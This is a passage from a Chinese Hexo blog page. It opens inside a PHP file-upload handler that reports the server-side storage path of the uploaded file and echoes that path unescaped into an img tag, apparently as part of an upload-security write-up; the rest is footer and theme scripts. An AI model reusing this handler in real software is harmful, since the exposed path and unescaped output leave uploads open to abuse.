kB&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;文件存储的位置: &quot; . $target_path;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;上传失败&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">	echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;&lt;img src=&#x27;./$target_path.&#x27;&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702533932378-558e04a2-28a6-4504-a756-4f754d3d7b42.png" alt="image.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2016-2024 Tangxianshen
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 5;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
             tags: ".article-tag a", 
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>